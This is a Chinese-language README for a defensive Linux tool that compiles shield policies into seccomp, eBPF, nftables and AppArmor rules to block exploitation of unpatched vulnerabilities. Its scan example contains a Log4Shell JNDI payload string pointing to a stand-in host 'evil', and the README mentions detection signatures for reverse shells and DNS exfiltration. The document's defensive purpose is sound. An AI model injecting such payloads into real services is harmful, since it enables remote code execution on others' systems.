# aegis — Linux 运行时防护引擎（临时 eBPF / seccomp 护盾）

> **aegis**（希腊语「宙斯之盾」）是一个**零依赖、纯 Python** 的 Linux 运行时防护控制平面。
> 它把一份**声明式护盾策略（shield policy）**编译成多种内核后端的**可执行加固产物**——
> seccomp-BPF、eBPF、AppArmor、nftables、iptables——外加一个可读的 dry-run 审计计划。
> 灵感来自 OpenAI + Cisco 于 2026-11-23 开源的运行时防护项目 **Shirudo**（日语「盾」）。

---

## 解决什么问题

漏洞被发现的速度，已经快过打补丁的速度（「负漏洞窗口期」：平均利用时间早于补丁发布）。
当 Log4Shell / Spring4Shell / Java4Shell 这类 n-day 漏洞公开、而官方二进制补丁还要数周才能铺到生产时，
运维被夹在中间：**关掉服务伤业务，继续开着可能被打穿**。

aegis 的思路与 Shirudo 一致：**不等补丁，先给运行中的服务套一层可热插拔的「盾」**——
在服务不停机、不重启、PID 不变、长连接不断的前提下，阻断漏洞利用所依赖的那条代码路径，
为「测试并部署正式补丁」争取时间窗口。补丁落地后，护盾自动退役。

> ⚠️ 关键边界：护盾改变的是**攻击者能触达什么**，而不是**代码本身是什么**。
> 漏洞在加载护盾后依然存在于二进制里；护盾只是把它与利用行为隔离开。护盾「买来时间」，不「关闭发现」。

---

## 核心能力

| 能力 | 说明 |
|------|------|
| **声明式策略** | 一份 YAML/JSON 描述「目标进程 + 网络/系统调用/文件/进程派生的放行与阻断」 |
| **多后端编译** | 同一策略按规则类别分发到 seccomp（syscall/spawn）、nftables/iptables（network）、AppArmor（files）、eBPF（全类别） |
| **CVE 特征库** | 内置 Log4Shell / Spring4Shell / DirtyPipe / 反弹 Shell / DNS 外带等利用特征，扫描进程快照命中并推荐护盾 |
| **自然语言生成** | 一句话「block outbound dns except to 10.0.0.53」→ 确定性解析为可编译策略（离线，可接真实 LLM） |
| **dry-run 审计** | `audit` 后端永远不强制，只输出「会做什么」的决策清单，配合 `mode: audit` 影子观察 |
| **HTTP 控制平面** | `/v1/compile` `/v1/apply` `/v1/scan` `/v1/gen` 等，供 AI Agent 以代码速度驱动 |
| **临时护盾生命周期** | `enforcement.duration: 7d` 表示临时护盾，到期自动退役 |

---

## 快速开始

```bash
# 1) 环境自检（零依赖，Python 3.9+）
python -m aegis doctor

# 2) 列出内置配置 / 特征 / 后端
python -m aegis list

# 3) 一句话生成策略
python -m aegis gen "block outbound dns except to 10.0.0.53"

# 4) 编译一份策略到各后端产物
python -m aegis compile --policy config/policies/log4shell-shield.yaml

# 5) dry-run 应用（审计模式，不做任何真实改动）
python -m aegis apply --policy config/policies/network-isolate.yaml --backend audit

# 6) 扫描一个进程快照
python -m aegis scan --cmdline "java -jar app.jar" --argv "java" "-jar" "app.jar" '${jndi:ldap://evil/x}'

# 7) 启动 HTTP 控制平面
python -m aegis serve --port 8700
```

---

## 一份护盾策略长什么样

```yaml
name: log4shell-shield
version: "1"
description: 临时阻断 Log4Shell JNDI 外联与子进程派生，补丁落地后退役
target:
  process: java
rules:
  - type: network
    deny: ["*"]
    allow: ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
    ports_deny: [389, 636, 1099, 1389]
  - type: spawn
    deny: ["*"]
enforcement:
  backend: auto            # 按类别分发：network->nftables, spawn->seccomp
  mode: enforce            # enforce | audit（audit=只记录不阻断）
  duration: 7d             # 临时护盾，7 天后退役
```

`python -m aegis compile --policy <上述文件>` 会产出：

- `nftables`：`nft` 规则文本，阻断出站到非私网段 + 389/636/1099/1389 端口
- `seccomp`：经典 BPF 指令序列，deny `execve/execveat/fork/vfork/clone/clone3`
- `audit`：人类可读的决策清单（dry-run 视角）

---

## 目录结构

```
aegis/
├── aegis/                  # 核心包
│   ├── backend/            # seccomp / ebpf / apparmor / nftables / iptables / audit
│   ├── policy/             # 加载 / 校验 / 编译 / 内建配置 / diff
│   ├── signature/          # CVE 特征库 + 匹配 + 护盾推荐
│   ├── nlgen/              # 自然语言 -> 策略（确定性解析 + mock LLM）
│   ├── gateway/            # HTTP 控制平面
│   ├── ebpf/               # IR -> BPF C 代码生成 + 模板
│   ├── metrics/            # Prometheus 指标
│   ├── audit/              # 审计事件（JSONL / SQLite 落库）
│   └── utils/              # 无依赖工具集
├── config/policies/        # 可复用护盾策略样例
├── examples/               # 12+ 可运行示例
├── tests/                  # unittest 全套
├── docs/                   # 架构 / 后端 / 部署文档
├── deploy/                 # Docker / K8s / Helm / systemd
├── prompts/                # 给真实 LLM 的提示词模板
└── scripts/                # 安装 / 演示脚本
```

---

## 安装

```bash
pip install .            # 或 pip install -e .
# 零运行时依赖；PyYAML 可选（缺失时自动回退内置极简 YAML 解析器）
```

## 后端能力矩阵

| 后端 | 覆盖类别 | 产物 | 前置条件 |
|------|---------|------|---------|
| `seccomp` | syscalls / spawn | 经典 BPF 指令 | Linux，`prctl(PR_SET_SECCOMP)` |
| `ebpf` | 全类别 | `.bpf.c` + `loader.sh` | Linux ≥5.x，`clang -target bpf` |
| `apparmor` | files | AppArmor profile 文本 | `apparmor_parser` |
| `nftables` | network | nft 规则文本 | `nft` |
| `iptables` | network | iptables 命令 | `iptables`（legacy 兜底） |
| `audit` | 全类别 | 决策清单 | 无（dry-run，永远可跑） |

`enforcement.backend: auto` 会**按类别自动分发**：network→nftables、syscalls/spawn→seccomp、files→apparmor，
并在最后附加一份 `audit` 计划。`fallback` 数组声明降级顺序（默认 `seccomp -> nftables -> audit`）。

## 自然语言生成（离线确定性 + 可接真实 LLM）

```bash
python -m aegis gen "make the filesystem read-only except /tmp"
python -m aegis gen "deny execve and fork"
```

内置 `aegis.nlgen.parser.NlParser` 是**确定性规则解析器**（关键词 + 正则，无网络无密钥），
用于离线验证整条链路。接入真实模型时，把 `aegis/nlgen/mock_llm.py` 的 `generate()` 替换为你的
LLM 调用，配合 `prompts/shield_generation.system.md` 的提示词即可。

## 安全模型（诚实边界）

- `audit` 后端与 `mode: audit` **永远不强制**，只记录，天然安全，可放心 dry-run。
- `seccomp/nftables/iptables/apparmor/ebpf` 的 `compile` 仅**生成产物文本/指令**，不落盘不执行；
  `apply` 需要 root 且需在真实 Linux 主机上手动执行（本仓库不自动提权）。
- 编译产物中的 `*`（deny-all）会诚实暴露：deny-all 是危险操作，文档多处提示「先 audit 后 enforce」。
- 特征匹配是基于「证据」的启发式（argv/cmdline/端口/内核版本），会有误报/漏报，置信度已标注，需人工复核。

## 开发

```bash
make test          # 运行全部 unittest
make lint          # compileall 语法检查
make doctor        # 自检
python -m unittest discover -s tests -v
```

## 许可证

MIT。eBPF 程序（`aegis/ebpf/templates/*` 与生成产物）按内核 GPL 要求，附加 GPL-2.0 兼容声明。
本仓库为教学/研究用途的**控制平面实现**，不包含 Shirudo 的任何代码。
